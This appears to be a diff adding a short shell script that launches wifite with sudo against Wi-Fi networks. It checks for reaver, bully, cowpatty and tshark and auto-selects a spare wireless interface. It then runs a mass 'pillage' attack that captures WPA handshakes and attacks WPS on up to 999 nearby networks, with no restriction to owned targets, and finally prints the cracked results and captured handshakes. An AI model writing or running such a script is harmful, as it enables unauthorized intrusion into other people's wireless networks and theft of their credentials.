@@ -1,0 +1,27 @@
+#!/bin/sh
+set -e -x
+
+which wifite reaver tshark bully cowpatty
+
+IFACE=$1
+if [ -z "${IFACE}" ]; then
+  echo "Available interfaces:"
+  ls /sys/class/net/
+  IFACE=$(ls /sys/class/net/ | grep '^wlan' | grep -v '^wlan0$' | tail -1)
+  if [ -z "${IFACE}" ]; then
+    echo "No suitable wlan interface found (need wlan* other than wlan0)"
+    exit 1
+  fi
+  echo "Auto-selected: ${IFACE}"
+fi
+
+#BAND5=""
+BAND5="-5"
+
+#sudo wifite -i ${IFACE} -5 --wps-only -vvvv --first 999 --pillage 60 --ignore-cracked --skip-crack --ignore-captured
+###sudo wifite -i ${IFACE} ${BAND5} --wps-only -vvvv --first 999 --pillage 60 --ignore-cracked --skip-crack --ignore-captured
+#sudo wifite -i ${IFACE} -5 --clients-only --wpa --wps -vvvv --first 999 --pillage 300 --ignore-cracked --skip-crack --ignore-captured
+sudo wifite -i ${IFACE} ${BAND5} --clients-only --wpa --wps -vvvv --first 999 --pillage 300 --ignore-cracked --skip-crack --ignore-captured
+
+cat cracked.json || true
+tree hs
